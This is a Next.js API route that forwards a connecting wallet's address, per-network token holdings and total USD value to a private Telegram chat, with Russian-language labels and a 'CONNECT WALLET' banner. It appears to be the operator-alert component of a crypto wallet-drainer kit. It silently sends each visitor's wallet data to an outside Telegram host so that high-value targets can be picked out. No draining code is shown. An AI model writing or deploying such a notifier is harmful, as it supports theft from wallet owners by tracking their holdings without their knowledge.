import { NextResponse } from 'next/server'

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

interface Balance {
  network: string
  native: string
  tokens?: string[]
  balance: number
  usdValue: string
  price: number
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { address, balances, totalUsd, prices } = body

    let message = `*👨🏻‍🚒 CONNECT WALLET\\!*\n`
    message += `━━━━━━━━━━━━━━━━━━━━━━\n`
    
    message += `🎯 *Адрес:*\n`
    message += `\`${address}\`\n\n`
    
    message += `🌲 *РЫНОЧНЫЕ ЦЕНЫ:*\n`
    message += `├ 🪸 POL: *$${prices.pol?.toFixed(4) || '0'}*\n`
    message += `├ 🏹 ARB: *$${prices.arb?.toFixed(4) || '0'}*\n`
    message += `└ 🥪 USDT/USDC: *$1\\.00*\n\n`
    
    message += `🪵 *АКТИВЫ ПО СЕТЯМ:*\n`
    
    const networkEmojis: { [key: string]: string } = {
      'Polygon': '🪸  POLYGON',
      'Base': '🌴 BASE',
      'Arbitrum': '🏹 ARBITRUM',
    }
    
    for (const balance of balances as Balance[]) {
      const networkLabel = networkEmojis[balance.network] || balance.network.toUpperCase()
      message += `🪽 *${networkLabel}*\n`
      
      
      if (balance.tokens && balance.tokens.length > 0) {
        for (const token of balance.tokens) {
          message += `  ├─ \`${token}\`\n`
        }
      }
      
      message += `  💰 Стоимость: *$${balance.usdValue} USD*\n`
    }

    
    message += `\n*💎 ИТОГО: $${totalUsd} USD*\n`

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
    
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    })

    const data = await response.json()

    if (!response.ok) {
      console.error('Telegram API error:', data)
      return NextResponse.json({ error: 'Failed to send message' }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('Error sending to Telegram:', error)
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
  }
}
